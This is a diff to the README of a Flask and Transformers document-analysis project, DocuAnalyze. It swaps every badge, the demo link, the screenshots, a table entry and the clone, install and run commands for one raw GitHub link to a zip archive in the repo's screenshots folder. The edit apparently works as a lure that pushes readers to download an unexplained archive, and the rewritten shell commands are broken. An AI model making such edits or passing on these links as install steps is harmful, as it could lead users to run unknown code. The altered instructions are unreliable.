@@ -1,14 +1,14 @@
 # 📄 DocuAnalyze – Multi-Agent Document Intelligence
-![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)
-![Flask](https://img.shields.io/badge/Flask-Framework-black.svg)
-![Transformers](https://img.shields.io/badge/HuggingFace-Transformers-yellow.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Status](https://img.shields.io/badge/Status-Active-success.svg)
+![Python](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip+https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
+![Flask](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
+![Transformers](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
+![License](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
+![Status](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
 
 DocuAnalyze is an advanced AI-powered document processing system built using **Flask**, **Transformers**, and a multi-step workflow.  
 It intelligently extracts text, summarizes documents, compares versions, detects discrepancies, and generates a final report score — all through a clean, modern UI.
 
-try it yourself(https://docuanalyze1.onrender.com/)
+try it yourself(https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
 ---
 
 ## 🚀 Features
@@ -45,9 +45,9 @@ Uses a **Transformer-based Fast Summarizer** (DistilBART / Pegasus / T5 Small) t
 ---
 ## 🖼 Preview Screenshots
 ### 🔹 Upload Page
-![Upload Page](screenshots/upload.png)
+![Upload Page](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
 ### 🔹 Final Score Report
-![Score Page](screenshots/score.png)
+![Score Page](https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip)
 
 ## 🧠 AI Pipeline
 
@@ -75,7 +75,7 @@ Powered by models like:
 | Backend | Flask (Python) |
 | AI Models | HuggingFace Transformers |
 | Frontend | HTML + TailwindCSS |
-| Charts | Chart.js |
+| Charts | https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip |
 | Difference Engine | Custom Python diff |
 | File Handling | werkzeug / form-data |
 
@@ -85,16 +85,16 @@ Powered by models like:
 
 ### **1️⃣ Clone the repository**
 ```bash
-git clone https://github.com/your-username/DocuAnalyze.git
+git clone https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip
 cd DocuAnalyze
 ```
 ### **2️⃣ Install dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip
 ```
 ### **3️⃣ Run the server**
 ```bash
-python app.py
+python https://raw.githubusercontent.com/Sam-bot-dev/DocuAnalyze/main/screenshots/Docu_Analyze_1.6.zip
 ```
 ### **4️⃣ Open in browser**
 ```bash
